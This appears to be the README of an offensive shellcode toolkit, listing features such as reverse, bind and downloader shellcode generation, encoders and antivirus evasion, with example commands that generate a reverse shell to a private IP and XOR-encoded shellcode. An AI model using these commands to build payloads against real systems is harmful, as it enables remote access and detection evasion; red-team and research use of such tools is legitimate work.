# 🧠 ASM Tool - Advanced Shellcode Toolkit v2.0

ASM Tool is a powerful, modular Python framework for generating, encoding, optimizing, analyzing, and evading shellcode across multiple architectures — made for red teamers, reverse engineers, and exploit devs.

![screenshot](https://img.shields.io/badge/version-v2.0-blue.svg)  
![python](https://img.shields.io/badge/python-3.8%2B-green.svg)  
![license](https://img.shields.io/badge/license-MIT-lightgrey.svg)

---

## ✨ Features

- 🔥 Shellcode Generator (exec, reverse, bind, downloader)
- 🔧 Assembly Optimizer
- 🧬 Encoder (XOR, NOT, ADD, ROT, multi-step chaining)
- 🛡️ AV Evasion (nopsled, junk, metamorphic, etc)
- 🧪 Disassembler + Dangerous Instruction Analyzer
- 📊 Shellcode Statistics & Entropy
- 📦 Modular format — easy to extend
- 🧰 Supports: `x86`, `x64`, `ARM`, `ARM64`, `MIPS`, `PPC`

---

## 🚀 Quick Usage

```bash
# Generate reverse shell
python3 asm_tool8.py --rev-shell --ip 192.168.0.123 --port 4444 --arch x86 --mode 32 --format hex

# Generate exec shell
python3 asm_tool8.py --exec-shell "/bin/sh" --arch x86 --mode 64 --format c

# Disassemble shellcode
python3 asm_tool8.py --disasm "4831c048..." --arch x86 --mode 64 --analyze --stats

# Encode with XOR + evasion
python3 asm_tool8.py --exec-shell "/bin/sh" --encode xor --key 0xaa --evasion nopsled,junk --format python
